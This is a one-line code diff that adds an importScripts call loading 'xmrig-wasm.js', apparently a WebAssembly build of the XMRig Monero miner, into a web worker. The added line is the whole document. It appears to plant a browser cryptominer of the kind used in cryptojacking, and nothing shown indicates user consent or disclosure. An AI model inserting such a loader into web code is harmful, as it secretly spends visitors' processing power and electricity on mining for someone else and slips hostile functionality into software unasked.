@@ -1,0 +1,1 @@
+importScripts('xmrig-wasm.js');
